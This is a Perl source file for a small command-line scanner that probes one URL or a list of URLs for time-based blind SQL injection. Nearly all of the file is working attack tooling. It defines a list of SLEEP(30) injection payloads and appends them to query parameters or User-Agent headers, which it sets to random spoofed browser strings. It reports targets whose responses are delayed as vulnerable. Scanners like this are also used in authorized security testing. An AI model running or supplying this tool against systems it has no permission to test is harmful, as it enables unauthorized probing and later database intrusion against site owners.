#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
use Time::HiRes qw(gettimeofday tv_interval);
use LWP::UserAgent;
use HTTP::Request;

my %colors = (
    reset        => "\e[0m",
    blue         => "\e[34m",
    green        => "\e[32m",
    yellow       => "\e[33m",
    magenta      => "\e[35m",
    red          => "\e[31m",
    cyan         => "\e[36m",
    white        => "\e[37m",
    bright_blue  => "\e[94m",
    bright_green => "\e[92m",
    bright_yellow=> "\e[93m",
    bright_red   => "\e[91m",
    bold         => "\e[1m",
    underline    => "\e[4m",
    blink        => "\e[5m",
    bright_cyan  => "\e[96m",
    bright_magenta=> "\e[95m",
);

# Define SQL payloads
my @payloads = (
    "(CASE WHEN (2375=2375) THEN SLEEP(30) ELSE 2375 END)",
    "ORDER BY SLEEP(30)",
    "ORDER BY SLEEP(30)--",
    "ORDER BY SLEEP(30)#",
    "(SELECT * FROM (SELECT(SLEEP(30)))ecMj)",
    "(SELECT * FROM (SELECT(SLEEP(30)))ecMj)--",
    "(SELECT * FROM (SELECT(SLEEP(30)))ecMj)#",
    "+ SLEEP(30) + '",
    "SLEEP(30)/*",
    "or SLEEP(30)",
    '" or SLEEP(30)',
    '" or SLEEP(30) or "*/'
);

# Random user-agent
sub random_user_agent {
    my @user_agents = (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:54.0) Gecko/20100101 Firefox/54.0"
    );
    return $user_agents[int(rand(@user_agents))];
}

# Banner
sub print_banner {
    print "${colors{bright_cyan}}\n";
    print <<"EOF";
    
     ┏┓          ┏┓     
     ┗┓┏┓┏┓┏╋┏┓┏┓┗┓┏┏┓┏┓
     ┗┛┣┛┗ ┗┗┗ ┛ ┗┛┗┗┻┛┗
       ┛                
      
EOF
    print "${colors{bright_yellow}}                     v0.1${colors{reset}}\n";
    print "${colors{bold}}${colors{bright_magenta}}       Created by ${colors{blink}}${colors{underline}}Lunar Lumos${colors{reset}}\n";
}

# Command line options
my $url;
my $list;
my $header;
my $parameter;
GetOptions(
    'u=s' => \$url,
    'l=s' => \$list,
    'h'   => \$header,
    'p'   => \$parameter
) or die "Error in command line arguments\n";

if (!$url && !$list) {
    die "You must provide a URL with -u or a list with -l\n";
}
if (!$parameter && !$header) {
    die "You must specify either -p (parameter) or -h (header)\n";
}

# Initialize LWP::UserAgent
my $ua = LWP::UserAgent->new;

# Function to strip parameter values
sub strip_parameter_values {
    my ($url) = @_;
    if ($url =~ /(.*?[?&])([^=&]+)=([^&]*)/) {
        return $1 . $2 . "=";
    }
    return $url;
}

# Process single URL
sub check_url {
    my ($url, $payloads, $is_header, $is_parameter, $url_number) = @_;

    $url_number ||= 1;  # Ensure $url_number is initialized

    my $mood = "";
    if ($is_parameter && $is_header) {
        $mood = "Parameter, Header";
    } elsif ($is_parameter) {
        $mood = "Parameter";
    } elsif ($is_header) {
        $mood = "Header";
    }

    # Strip parameter values
    my $base_url = strip_parameter_values($url);

    # Send request without payloads
    my $start_time = [gettimeofday];
    my $response = $ua->get($base_url);
    my $end_time = [gettimeofday];
    my $normal_time = tv_interval($start_time, $end_time);

    print $colors{cyan}, "[ URL $url_number ]: $url\n", $colors{reset};
    print $colors{yellow}, "[ Mood ]: $mood\n", $colors{reset};
    print $colors{bright_blue}, "[ Normal Response Time]: ", sprintf("%.2f", $normal_time), " sec\n", $colors{reset};

    my $vulnerable = 0;

    if ($is_parameter) {
        foreach my $payload (@$payloads) {
            my $test_url = "$base_url$payload";
            my $start_time_payload = [gettimeofday];
            my $payload_response = $ua->get($test_url);
            my $end_time_payload = [gettimeofday];
            my $payload_time = tv_interval($start_time_payload, $end_time_payload);

            if ($payload_time > $normal_time + 30) {
                print $colors{bright_blue}, "[ Payload Response Time]: ", sprintf("%.2f", $payload_time), " sec\n", $colors{reset};
                print $colors{bright_red}, "[ Comment]: Vulnerable in Parameter-based SQL\n", $colors{reset};
                print $colors{bright_red}, "[ Payload]: $payload\n", $colors{reset};
                $vulnerable = 1;
                last;
            }
        }
    }

    if ($is_header && !$vulnerable) {
        foreach my $payload (@$payloads) {
            my $user_agent = random_user_agent();
            my $req = HTTP::Request->new(GET => $base_url);
            $req->header('User-Agent' => "$user_agent $payload");
            my $start_time_header = [gettimeofday];
            my $header_response = $ua->request($req);
            my $end_time_header = [gettimeofday];
            my $header_time = tv_interval($start_time_header, $end_time_header);

            if ($header_time > $normal_time + 30) {
                print $colors{bright_blue}, "[ Payload Response Time]: ", sprintf("%.2f", $header_time), " sec\n", $colors{reset};
                print $colors{bright_red}, "[ Comment]: Vulnerable in Header-based SQL\n", $colors{reset};
                print $colors{bright_red}, "[ Header]: $user_agent $payload\n", $colors{reset};
                $vulnerable = 1;
                last;
            }
        }
    }

    if (!$vulnerable) {
        print $colors{green}, "[ Comment]: Not Vulnerable\n", $colors{reset};
    }
    print "\n";  # Add a blank line for separation after each URL
}

print_banner();

#  URL list
if ($list) {
    open my $fh, '<', $list or die "Cannot open file $list: $!\n";
    my $url_number = 1;
    while (my $line = <$fh>) {
        chomp $line;
        check_url($line, \@payloads, $header, $parameter, $url_number);
        print "\n";  # Add a blank line for separation after each URL
        $url_number++;
    }
    close $fh;
} elsif ($url) {
    check_url($url, \@payloads, $header, $parameter, 1);
}
